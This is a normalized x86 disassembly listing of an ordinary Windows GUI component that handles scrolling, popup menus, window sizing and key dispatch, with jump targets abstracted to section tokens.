mov ecx [ esp + 0x20 ]
push edx
push eax
push ebx
push esi
push edi
push ecx
mov ecx [ esp + 0x30 ]
call sub_40ddc0
mov edi [ edi ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x8
mov edx [ esp + 0x10 ]
movsx eax [ edx + 0x6 ]
movsx ecx [ edi + 0x1c ]
imul ecx eax
mov esi [ esi + 0x8 ]
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
add ebx edx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
sub_40eba0
push esi
push edi
mov edi [ esp + 0xc ]
movzx eax di
cmp eax 0x5
mov esi ecx
ja r-xdata
pop edi
pop esi
retn 0x4
jmp [ eax * 4 + jump_table_40ec60 ]
dec [ esi + 0x70 ]
jmp r-xdata
inc [ esi + 0x70 ]
jmp r-xdata
mov ax [ esi + 0x8a ]
imul ax ax 0xfffe
add [ esi + 0x70 ] ax
jmp r-xdata
mov cx [ esi + 0x8a ]
shl cx 0x1
add [ esi + 0x70 ] cx
jmp r-xdata
mov edx [ esi + 0x8 ]
push rw-data
push 0x0
push edx
call [ GetScrollInfo@IAT ]
shr edi 0x10
mov [ rw-data ] edi
mov [ esi + 0x70 ] di
mov cx [ esi + 0x88 ]
movsx edx [ esi + 0x70 ]
movsx edi cx
xor eax eax
mov ax [ esi + 0x7e ]
add edx edi
movsx edi ax
cmp edx edi
jle r-xdata
cmp [ esi + 0x70 ] 0x0
jge r-xdata
sub eax ecx
mov [ esi + 0x70 ] ax
push 0x1
lea eax [ esi + 0x68 ]
push eax
mov ecx esi
call sub_40e010
mov ecx esi
call sub_40e400
mov ecx esi
call sub_40e1a0
mov ecx esi
call sub_40db90
mov [ esi + 0x70 ] 0x0
sub_40ec80
push edi
mov edi ecx
mov al [ edi + 0x44 ]
test al al
jne r-xdata
push esi
mov esi [ esp + 0xc ]
push 0x0
push esi
mov ecx edi
call sub_40e010
mov ecx edi
call sub_40ea20
mov eax [ esi + 0x4 ]
mov cx [ eax ]
add [ esi + 0x8 ] cx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov [ esi + 0x4 ] edx
mov ecx [ edi + 0x1c ]
mov edx [ edi + 0x30 ]
cmp ecx edx
jne r-xdata
xor eax eax
pop edi
retn 0x4
cmp ecx eax
jne r-xdata
cmp ecx eax
jne r-xdata
cmp edx eax
jne r-xdata
mov ax [ edi + 0x24 ]
cmp ax [ esi + 0x8 ]
jg r-xdata
mov ecx esi
call sub_40db00
mov ecx edi
call sub_40db40
pop esi
xor eax eax
pop edi
retn 0x4
mov ax [ esi + 0x8 ]
cmp [ edi + 0x24 ] ax
jg r-xdata
mov eax [ esi + 0x10 ]
cmp [ edi + 0x2c ] eax
jg r-xdata
mov cx [ edi + 0x38 ]
cmp cx [ esi + 0x8 ]
jl r-xdata
pop esi
mov eax 0x1
pop edi
retn 0x4
cmp [ edi + 0x38 ] ax
jl r-xdata
cmp [ edi + 0x40 ] eax
jge r-xdata
pop esi
mov eax 0x1
pop edi
retn 0x4
pop esi
mov eax 0x1
pop edi
retn 0x4
sub_40ed40
mov eax [ rw-data ]
sub esp 0x10
push ebx
push ebp
push esi
push edi
push 0x0
push eax
mov ebx ecx
call [ GetSubMenu@IAT ]
mov ebp [ EnableMenuItem@IAT ]
mov edi eax
mov al [ ebx + 0x44 ]
xor ecx ecx
test al al
sete cl
mov esi ecx
push esi
push 0x2720
push edi
call ebp
push esi
push 0x271f
push edi
call ebp
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
xor eax eax
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cmp [ eax ] 0x0
je r-xdata
mov eax 0x1
jmp r-xdata
movzx edx [ rw-data ]
xor eax eax
cmp esi edx
setne al
lea ecx [ esi + 0x2728 ]
dec eax
and eax 0x8
push eax
push ecx
push edi
call ebp
inc esi
cmp esi 0x2
jle r-xdata
mov eax [ ebx + 0x8 ]
lea edx [ esp + 0x10 ]
push edx
push eax
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x14 ]
mov ebp [ esp + 0x28 ]
mov edx [ esp + 0x10 ]
mov esi [ esp + 0x24 ]
add ebp ecx
mov ecx ebx
add esi edx
call sub_40e6d0
mov ecx ebx
call sub_40db90
mov ecx [ ebx + 0x8 ]
push 0x0
push ecx
push 0x0
push ebp
push esi
push 0x2
push edi
call [ TrackPopupMenu@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0x8
mov eax 0x1
jmp r-xdata
xor edx edx
test eax eax
sete dl
push edx
push 0x271d
push edi
call ebp
mov eax [ rw-data ]
test eax eax
je r-xdata
xor ecx ecx
test eax eax
sete cl
push ecx
push 0x271e
push edi
call ebp
mov ebp [ CheckMenuItem@IAT ]
xor esi esi
sub_40ee50
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x58 ]
movsx ebx [ esi + 0x5c ]
mov ecx [ eax ]
movsx edx [ esi + 0x5c ]
mov eax [ esi + 0x58 ]
push edi
lea edi [ esi + 0x54 ]
push ebp
add ebx ecx
mov ecx [ esp + 0x18 ]
push ecx
mov ecx [ edi ]
push edx
push eax
push esi
call sub_421d20
mov ecx [ edi ]
mov edx [ ecx + 0x8 ]
push ebp
mov ecx edi
mov [ esi + 0x58 ] edx
mov [ esi + 0x5c ] bx
call sub_40e930
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub_40eea0
push ebx
push esi
push edi
mov edi ecx
call sub_40ea20
lea ebx [ edi + 0x54 ]
mov ecx ebx
call sub_40db00
mov esi [ edi + 0x4c ]
test esi esi
je r-xdata
mov eax [ ebx + 0x4 ]
mov cx [ eax ]
add [ ebx + 0x8 ] cx
mov edx [ ebx ]
mov eax [ edx + 0x8 ]
mov ecx edi
pop edi
pop esi
mov [ ebx + 0x4 ] eax
pop ebx
jmp sub_40db40
jmp r-xdata
push 0x0
push 0x0
push edi
mov ecx esi
call sub_421ad0
mov esi [ esi ]
test esi esi
jne r-xdata
sub_40eef0
mov eax [ esp + 0x4 ]
sub esp 0x28
test eax eax
push ebx
mov ebx ecx
jne r-xdata
cmp [ ebx + 0x44 ] 0x3
jne r-xdata
call sub_40e3d0
pop ebx
add esp 0x28
retn 0x4
mov al [ ebx + 0x44 ]
test al al
push ebp
push esi
push edi
jne r-xdata
mov ecx ebx
call sub_40e3d0
push 0x0
lea ebp [ ebx + 0x54 ]
push ebp
mov ecx ebx
call sub_40e010
mov al [ ebx + 0x45 ]
test al al
lea edi [ esp + 0x10 ]
mov ecx 0x5
lea eax [ ebx + 0x30 ]
je r-xdata
lea eax [ ebx + 0x54 ]
mov esi eax
lea edi [ ebx + 0x1c ]
mov ecx 0x5
[ edi ] [ esi ]
mov esi eax
lea edi [ ebx + 0x30 ]
mov ecx 0x5
[ edi ] [ esi ]
mov ecx ebx
mov [ ebx + 0x44 ] 0x1
mov [ ebx + 0x45 ] 0x0
call sub_4015b0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn 0x4
mov esi eax
[ edi ] [ esi ]
mov edi eax
mov esi ebp
mov ecx 0x5
[ edi ] [ esi ]
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x34 ]
jne r-xdata
lea eax [ ebx + 0x1c ]
mov eax [ ebx + 0x2c ]
mov ecx [ ebx + 0x40 ]
cmp eax ecx
jg r-xdata
mov cx [ ebx + 0x24 ]
cmp cx [ ebx + 0x38 ]
jne r-xdata
lea eax [ ebx + 0x1c ]
mov esi eax
mov ecx 0x5
lea edi [ esp + 0x24 ]
[ edi ] [ esi ]
mov edi eax
mov al [ ebx + 0x45 ]
lea edx [ ebx + 0x30 ]
mov ecx 0x5
mov esi edx
[ edi ] [ esi ]
test al al
mov ecx 0x5
lea esi [ esp + 0x24 ]
mov edi edx
sete al
[ edi ] [ esi ]
mov [ ebx + 0x45 ] al
jne r-xdata
cmp [ esp + 0x3c ] 0x2
je r-xdata
mov edx [ ebp ]
push eax
push edx
push ecx
mov ecx ebx
call sub_40e330
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn 0x4
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push eax
mov ecx ebx
call sub_40e330
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn 0x4
mov eax [ ebx + 0x64 ]
mov ecx [ esp + 0x20 ]
cmp ecx eax
jle r-xdata
mov edx [ ebx + 0x28 ]
cmp edx [ ebx + 0x3c ]
jle r-xdata
mov ecx ebx
call sub_40e3d0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn 0x4
sub_40f040
push ebx
mov ebx ecx
mov al [ ebx + 0x44 ]
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x1c ]
push ebp
push esi
push edi
lea ebp [ ebx + 0x1c ]
push eax
push 0x30
call sub_424dd0
mov ecx ebx
call sub_40ea20
mov eax [ ebp ]
mov ecx [ ebx + 0x30 ]
cmp eax ecx
jne r-xdata
lea edi [ ebx + 0x54 ]
mov ecx 0x5
mov esi ebp
[ edi ] [ esi ]
movsx ecx [ ebx + 0x24 ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp ]
mov eax [ edx ]
cmp eax [ ebx + 0x30 ]
je r-xdata
movsx eax [ ebx + 0x38 ]
movsx esi [ ebx + 0x24 ]
mov edx eax
sub edx esi
cmp eax [ ecx + 0x18 ]
jge r-xdata
mov eax [ ebx + 0x30 ]
movsx edx [ ebx + 0x38 ]
mov esi [ eax + 0x18 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp ]
sub esi edx
push esi
lea edx [ eax + edx * 2 ]
movsx eax [ ebx + 0x24 ]
push edx
mov edx [ ecx + 0x8 ]
push eax
push edx
push ebx
call sub_421d20
mov eax [ ebx + 0x30 ]
push eax
mov ecx ebx
call sub_4218f0
mov ecx [ ebp ]
mov edx [ ecx ]
push edx
mov ecx ebx
call sub_4218f0
mov eax [ ebp ]
mov ecx [ eax ]
cmp ecx [ ebx + 0x30 ]
jne r-xdata
mov eax [ ebp ]
sub [ eax + 0x18 ] edx
sub [ ebx + 0x5c ] dx
mov cx [ ebx + 0x5c ]
mov ax [ ebx + 0x24 ]
cmp cx ax
jge r-xdata
mov ecx eax
sub ecx edx
shl ecx 0x1
lea ecx [ ebx + 0x54 ]
call sub_40db00
mov ecx ebx
call sub_40e3d0
mov ecx ebx
call sub_40ea70
mov ecx [ ebx + 0x20 ]
push 0x1
push ecx
mov ecx [ ebp ]
push ebx
call sub_421ad0
pop edi
pop esi
pop ebp
mov [ ebx + 0x5c ] ax
jmp r-xdata
mov esi [ ebx + 0x30 ]
mov esi [ esi + 0x10 ]
mov edi [ ebp ]
mov si [ esi + eax * 2 ]
mov edi [ edi + 0x10 ]
mov [ ecx + edi ] si
mov esi [ ebx + 0x30 ]
mov edi [ esi + 0x18 ]
inc eax
add ecx 0x2
cmp eax edi
jl r-xdata
sub_40f160
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
mov [ esi + 0x48 ] 0x0
call sub_420ca0
push eax
call sub_431a26
add esp 0x8
mov ecx esi
mov [ esi + 0x90 ] eax
call sub_40e4b0
pop esi
retn 0x4
sub_40f190
sub esp 0x10
push ebp
push esi
mov esi ecx
xor ebp ebp
test esi esi
je r-xdata
pop esi
pop ebp
add esp 0x10
retn
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push ebx
push edi
lea ecx [ esp + 0x10 ]
push ecx
push eax
call [ GetClientRect@IAT ]
mov cl [ esi + 0xc ]
cmp cl 0x40
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x1c ]
mov [ esi + 0x86 ] ax
mov [ esi + 0x84 ] bx
mov edi rw-data
je r-xdata
mov edx rw-data
jmp r-xdata
mov edi rw-data
mov edx edi
movsx edi [ edi + 0x12 ]
movsx eax ax
sub eax edi
movsx edi [ edx + 0x2 ]
cdq
idiv edi
mov [ esi + 0x88 ] ax
movsx eax ax
cdq
and edx 0x3
add eax edx
sar eax 0x2
cmp cl 0x40
mov [ esi + 0x8a ] ax
mov edx rw-data
je r-xdata
mov eax rw-data
jmp r-xdata
mov edx rw-data
mov eax edx
movsx edx [ edx + 0x6 ]
imul dx dx 0xfffe
sub dx [ eax + 0x14 ]
add edx ebx
mov ebx 0x1
cmp [ esi + 0x8a ] bx
mov [ esi + 0x8c ] dx
jge r-xdata
cmp cl 0x40
je r-xdata
mov [ esi + 0x8a ] bx
push ebx
lea ecx [ esi + 0x68 ]
push ecx
mov ecx esi
call sub_40e010
push 0x0
lea edx [ esi + 0x54 ]
push edx
mov ecx esi
call sub_40e010
mov al [ esi + 0x44 ]
test al al
pop edi
pop ebx
je r-xdata
movzx eax [ rw-data ]
sub eax 0x0
je r-xdata
mov ecx esi
call sub_40e6d0
call [ GetActiveWindow@IAT ]
cmp [ esi + 0x8 ] eax
jne r-xdata
push 0x0
lea eax [ esi + 0x1c ]
push eax
mov ecx esi
call sub_40e010
push 0x0
lea ecx [ esi + 0x30 ]
push ecx
mov ecx esi
call sub_40e010
movsx ebp [ esi + 0x88 ]
dec eax
je r-xdata
mov ecx esi
call sub_4015b0
mov ecx esi
call sub_40e1a0
mov ecx esi
call sub_40db90
mov edi [ GetSystemMetrics@IAT ]
push 0x1f
call edi
push 0xf
mov ebp eax
call edi
add ebp eax
mov [ esi + 0x8e ] bp
mov ecx esi
mov [ esi + 0x7e ] bp
call sub_40eea0
movsx ebp [ rw-data ]
jmp r-xdata
dec eax
jne r-xdata
movsx eax [ esi + 0x7e ]
cmp eax ebp
je r-xdata
lea ecx [ esi + 0x94 ]
call sub_422b70
mov ebp eax
jmp r-xdata
sub_40f360
mov eax [ esp + 0x4 ]
add eax 0xfffffff8
cmp eax 0xb6
push esi
mov esi ecx
ja r-xdata
pop esi
retn 0xc
movzx eax [ eax + lookup_table_410170 ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push edi
mov bl 0x3
jmp [ eax * 4 + jump_table_4100c8 ]
mov ecx rw-data
call sub_402620
push ebp
mov ecx esi
call sub_40eef0
xor edi edi
push edi
mov ecx esi
mov [ esi + 0x7c ] di
call sub_424aa0
cmp [ esp + 0x18 ] edi
je r-xdata
mov ecx rw-data
call sub_402620
push ebp
mov ecx esi
call sub_40eef0
push 0x0
mov ecx esi
mov [ esi + 0x7c ] 0x0
call sub_424aa0
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov ecx rw-data
call sub_402620
push 0x0
mov ecx esi
mov [ esi + 0x7c ] 0x0
call sub_424aa0
push ebp
mov ecx esi
call sub_40eef0
mov eax [ esp + 0x18 ]
test eax eax
mov ecx esi
jne r-xdata
mov ecx rw-data
call sub_402620
push 0x0
mov ecx esi
mov [ esi + 0x7c ] 0x0
call sub_424aa0
push ebp
mov ecx esi
call sub_40eef0
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
xor ebp ebp
push 0x1
mov ecx esi
mov [ esi + 0x7c ] bp
call sub_424aa0
mov ecx rw-data
call sub_417ce0
test eax eax
je r-xdata
xor ebp ebp
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push 0x0
mov ecx esi
call sub_424aa0
push esi
mov ecx rw-data
call sub_409f20
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push 0x0
mov ecx esi
call sub_424aa0
mov eax [ esp + 0x1c ]
test eax eax
push esi
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push 0x0
mov ecx esi
call sub_403e90
jmp r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push 0x1
mov ecx esi
call sub_403e90
jmp r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push 0xa
call sub_425660
add esp 0x4
jmp r-xdata
mov ecx [ esi + 0x64 ]
mov edi [ esi + 0x78 ]
mov edx [ esi + 0x60 ]
sub ecx edi
push ecx
sub edx [ esi + 0x74 ]
push edx
mov ecx esi
call sub_40ed40
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
mov eax [ esi + 0x64 ]
mov ebx [ esi + 0x78 ]
mov ecx [ esi + 0x60 ]
mov edx [ esi + 0x74 ]
sub eax ebx
sub ecx edx
push eax
push ecx
mov ecx esi
call sub_40ed40
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
cmp [ esi + 0x44 ] 0x2
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov ecx rw-data
call sub_402620
push 0x0
mov ecx esi
call sub_424aa0
push ebp
mov ecx esi
call sub_40eef0
cmp [ esi + 0x7c ] 0x0
jne r-xdata
mov ecx rw-data
call sub_402620
push 0x0
mov ecx esi
call sub_424aa0
push ebp
mov ecx esi
call sub_40eef0
cmp [ esi + 0x7c ] 0x0
jne r-xdata
mov ecx rw-data
call sub_402620
push 0x9
mov ecx esi
call sub_417d20
pop edi
pop ebp
pop ebx
mov [ esi + 0x5c ] di
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x68 ] eax
mov [ esi + 0x54 ] eax
mov eax [ eax + 0x8 ]
mov ecx esi
mov [ esi + 0x6c ] eax
mov [ esi + 0x58 ] eax
mov [ esi + 0x78 ] edi
call sub_40e1a0
mov edx [ esi + 0x58 ]
mov ax [ edx + 0x4 ]
mov [ esi + 0x5c ] ax
jmp r-xdata
mov eax [ esi + 0x50 ]
mov ecx [ esi + 0x80 ]
mov [ esi + 0x68 ] eax
mov [ esi + 0x54 ] eax
mov eax [ eax + 0xc ]
mov [ esi + 0x6c ] eax
mov [ esi + 0x58 ] eax
mov [ esi + 0x78 ] ecx
push ebp
call sub_40eef0
lea edi [ esi + 0x54 ]
mov ecx edi
call sub_40dca0
test eax eax
jne r-xdata
call sub_40dd40
jmp r-xdata
lea edi [ esi + 0x54 ]
mov ecx edi
call sub_40db70
push eax
call sub_4175c0
mov ebp eax
add esp 0x4
cmp ebp 0x5
jne r-xdata
mov ecx esi
call sub_40dd80
jmp r-xdata
cmp [ esi + 0x44 ] bl
jne r-xdata
push ebp
mov ecx esi
call sub_424aa0
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
cmp [ esp + 0x1c ] ebp
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
push 0x1
mov ecx esi
call sub_401e50
mov ecx esi
call sub_40e6d0
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
push esi
call sub_41fde0
add esp 0x4
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
test ebp ebp
je r-xdata
mov ecx esi
call sub_401bd0
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
push esi
call sub_41fec0
add esp 0x4
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
push 0x2
call sub_425660
add esp 0x4
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
push 0x0
call sub_425660
add esp 0x4
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
call sub_420070
add esp 0x4
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
call sub_41fc30
add esp 0x4
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
push esi
call sub_420330
add esp 0x4
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
push 0x1
mov ecx esi
call sub_401e50
jmp r-xdata
mov ecx rw-data
mov [ esi + 0x7c ] 0x0
call sub_402620
lea edi [ esi + 0x54 ]
mov ecx edi
call sub_40db70
push eax
call sub_4175c0
add esp 0x4
mov ecx edi
mov ebp eax
call sub_40dca0
test eax eax
jne r-xdata
mov ecx esi
call sub_40f340
jmp r-xdata
mov ecx esi
call sub_4251b0
jmp r-xdata
mov ecx esi
call sub_4251d0
jmp r-xdata
mov ecx rw-data
mov [ esi + 0x7c ] 0x0
call sub_402620
mov ecx esi
call sub_424d30
cmp [ esi + 0x44 ] 0x1
mov ecx esi
jne r-xdata
push 0x0
mov ecx esi
call sub_403e90
mov al [ rw-data ]
test al al
jne r-xdata
push 0x0
mov ecx esi
call sub_403e90
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
push 0x1
mov ecx esi
call sub_403e90
jmp r-xdata
movsx ecx [ esi + 0x8c ]
mov ebp [ esi + 0x64 ]
lea edi [ esi + 0x54 ]
sub ebp ecx
mov ecx edi
call sub_40dad0
test eax eax
jne r-xdata
mov ax [ esi + 0x60 ]
mov [ esi + 0x7c ] ax
movsx ebp [ esi + 0x8c ]
mov edx [ esi + 0x64 ]
lea edi [ esi + 0x54 ]
mov ecx edi
add ebp edx
call sub_40daa0
test eax eax
jne r-xdata
mov ax [ esi + 0x60 ]
mov [ esi + 0x7c ] ax
mov ecx esi
call sub_40e6d0
push 0x1
mov ecx esi
call sub_40eef0
mov ecx edi
call sub_40db70
push eax
call sub_4175c0
add esp 0x4
mov ecx edi
mov ebp eax
call sub_40dca0
test eax eax
jne r-xdata
push ebp
push eax
push 0x25
mov ecx esi
call sub_40f360
mov ecx edi
call sub_40dcd0
test eax eax
jne r-xdata
mov ebp 0xa
mov al [ esi + 0x44 ]
cmp al 0x2
jne r-xdata
mov ecx esi
call sub_40e3d0
mov ecx rw-data
call sub_402620
cmp [ esi + 0x44 ] bl
jne r-xdata
mov ecx esi
call sub_40f340
mov ecx esi
call sub_40e6d0
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
mov al [ rw-data ]
test al al
sete dl
mov ecx rw-data
mov [ rw-data ] dl
call sub_424520
mov ecx esi
call sub_40e6d0
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
push 0x1
call sub_425660
add esp 0x4
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
mov ecx rw-data
call sub_402620
mov eax [ esi + 0x4c ]
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_41fd10
add esp 0x4
jmp r-xdata
push 0x0
mov ecx esi
call sub_424aa0
mov ecx esi
call sub_40ea20
mov al [ esi + 0x44 ]
test al al
je r-xdata
push esi
call sub_41ff90
add esp 0x4
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
push esi
call sub_420150
add esp 0x4
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
push esi
call sub_420250
add esp 0x4
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
mov ecx edi
call sub_40db70
push eax
call sub_4175c0
add esp 0x4
cmp ebp eax
jne r-xdata
lea ebx [ ebx ]
call sub_40e3d0
call sub_40f040
jmp r-xdata
mov ecx rw-data
call sub_402620
push 0x0
mov ecx esi
call sub_424aa0
push ebp
mov ecx esi
call sub_40eef0
cmp [ esi + 0x7c ] 0x0
jne r-xdata
mov ecx rw-data
call sub_402620
push 0x0
mov ecx esi
call sub_424aa0
push ebp
mov ecx esi
call sub_40eef0
cmp [ esi + 0x7c ] 0x0
jne r-xdata
movsx edx [ esi + 0x7c ]
push 0x0
push edx
push esi
mov ecx edi
call sub_40da20
jmp r-xdata
push 0x2
push edi
mov ecx esi
call sub_40e010
cmp [ esi + 0x64 ] ebp
jle r-xdata
movsx ecx [ esi + 0x7c ]
push 0x0
push ecx
push esi
mov ecx edi
call sub_40da20
jmp r-xdata
push 0x2
push edi
mov ecx esi
call sub_40e010
cmp [ esi + 0x64 ] ebp
jge r-xdata
mov ecx edi
call sub_40db70
push eax
call sub_4175c0
add esp 0x4
cmp ebp eax
jne r-xdata
lea esp [ esp ]
mov edi edi
test al al
je r-xdata
dec [ esi + 0x5c ]
movsx edx [ esi + 0x5c ]
mov eax [ esi + 0x58 ]
mov ecx [ esi + 0x54 ]
push edx
push eax
push esi
call sub_4220d0
mov ecx esi
call sub_40ea20
dec [ esi + 0x38 ]
mov ax [ esi + 0x38 ]
cmp [ esi + 0x24 ] ax
jne r-xdata
mov al [ esi + 0x44 ]
test al al
je r-xdata
mov ecx esi
call sub_40e3d0
mov ecx esi
call sub_4015b0
mov ecx esi
call sub_40e1a0
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
mov [ esi + 0x1c ] eax
mov [ esi + 0x44 ] 0x1
mov eax [ eax + 0x8 ]
lea ecx [ esi + 0x1c ]
mov [ esi + 0x20 ] eax
mov eax [ esi + 0x50 ]
mov [ esi + 0x24 ] 0x0
mov [ esi + 0x30 ] eax
mov edx [ eax + 0xc ]
lea edi [ esi + 0x30 ]
mov [ esi + 0x34 ] edx
mov eax [ eax + 0xc ]
mov dx [ eax + 0x4 ]
push 0x0
push ecx
mov ecx esi
mov [ esi + 0x38 ] dx
call sub_40e010
push 0x0
push edi
mov ecx esi
call sub_40e010
mov eax [ esi + 0x54 ]
movsx ecx [ esi + 0x5c ]
cmp ecx [ eax + 0x18 ]
jge r-xdata
mov eax [ esi + 0x1c ]
movsx ecx [ esi + 0x24 ]
cmp ecx [ eax + 0x18 ]
jge r-xdata
mov ecx edi
call sub_40dca0
test eax eax
jne r-xdata
mov ecx edi
call sub_40dca0
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x25
mov ecx esi
call sub_40f360
mov ecx edi
call sub_40db70
push eax
call sub_4175c0
add esp 0x4
mov ecx edi
mov ebp eax
call sub_40dca0
test eax eax
je r-xdata
cmp ebp 0x5
jne r-xdata
push eax
mov ecx esi
call sub_421980
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax [ esp + 0x18 ]
lea edi [ esi + 0x54 ]
test eax eax
mov eax [ edi ]
je r-xdata
lea ecx [ esi + 0x54 ]
call sub_40dad0
jmp r-xdata
mov ax [ esi + 0x60 ]
mov [ esi + 0x7c ] ax
lea ecx [ esi + 0x54 ]
call sub_40daa0
mov ax [ esi + 0x60 ]
mov [ esi + 0x7c ] ax
mov ecx edi
call sub_40dad0
test eax eax
je r-xdata
mov ecx edi
call sub_40daa0
test eax eax
je r-xdata
mov ecx edi
call sub_40dca0
test eax eax
jne r-xdata
mov ecx edi
call sub_40dca0
test eax eax
jne r-xdata
mov ecx esi
call sub_40dd40
mov ecx edi
call sub_40db70
push eax
call sub_4175c0
add esp 0x4
mov ecx edi
mov ebp eax
call sub_40dca0
test eax eax
je r-xdata
cmp ebp 0x5
jne r-xdata
cmp eax ebp
jne r-xdata
mov ebp 0xa
jmp r-xdata
lea ecx [ esi + 0x54 ]
call sub_40dca0
test eax eax
jne r-xdata
mov ecx esi
call sub_424d30
mov ecx esi
call sub_40f040
mov ecx esi
call sub_424ac0
jmp r-xdata
mov ecx esi
call sub_40db40
push ebp
lea ecx [ esi + 0x30 ]
push ecx
mov ecx esi
call sub_40e010
jmp r-xdata
call sub_40e3d0
lea edi [ esi + 0x54 ]
mov ecx edi
call sub_40dcd0
test eax eax
jne r-xdata
mov ecx esi
call sub_424d30
mov ecx esi
call sub_40f040
mov ecx esi
call sub_424ac0
mov ecx esi
call sub_40e6d0
pop edi
pop ebp
pop ebx
pop esi
retn 0xc
xor edi edi
mov edx [ eax + 0x10 ]
movzx edi [ edx + ecx * 2 ]
jmp r-xdata
mov eax [ eax + 0x10 ]
movzx edi [ eax + ecx * 2 ]
jmp r-xdata
cmp ebp 0x5
jne r-xdata
push eax
push eax
push 0x27
mov ecx esi
call sub_40f360
push eax
push eax
push 0x25
mov ecx esi
call sub_40f360
mov ecx edi
call sub_40db70
push eax
call sub_4175c0
add esp 0x4
cmp ebp eax
je r-xdata
cmp ebp 0xa
je r-xdata
mov eax [ edi ]
mov cl [ eax + 0x1e ]
test cl cl
je r-xdata
mov ecx esi
call sub_424ac0
jmp r-xdata
mov ecx edi
call sub_40dd00
test eax eax
je r-xdata
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
test eax eax
jne r-xdata
movsx edx [ esi + 0x7c ]
push eax
push edx
push esi
call sub_40da20
jmp r-xdata
mov ecx [ esp + 0x1c ]
push ecx
push eax
push 0x27
mov ecx esi
call sub_40f360
jmp r-xdata
mov ecx esi
call sub_40dd40
mov ecx edi
call sub_40db70
push eax
call sub_4175c0
add esp 0x4
cmp ebp eax
je r-xdata
cmp ebp 0xa
je r-xdata
mov ecx esi
call sub_40dd80
mov ecx edi
call sub_40dcd0
test eax eax
je r-xdata
mov ecx esi
call sub_40dd40
jmp r-xdata
mov ecx edi
call sub_40dd20
test eax eax
mov ecx esi
je r-xdata
mov ecx esi
call sub_40db40
mov eax [ esi + 0x8 ]
push edi
push eax
